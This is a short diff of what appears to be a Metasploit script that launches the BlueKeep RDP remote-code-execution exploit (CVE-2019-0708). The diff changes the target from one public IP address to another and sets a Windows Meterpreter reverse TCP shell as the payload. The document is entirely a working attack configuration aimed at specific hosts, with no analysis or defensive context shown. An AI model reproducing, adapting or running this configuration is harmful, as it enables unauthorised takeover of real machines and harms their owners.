@@ -1,5 +1,5 @@
 use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
-set RHOSTS 95.48.158.253
+set RHOSTS 149.86.131.230
 set RPORT 3389
 set TARGET 2
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
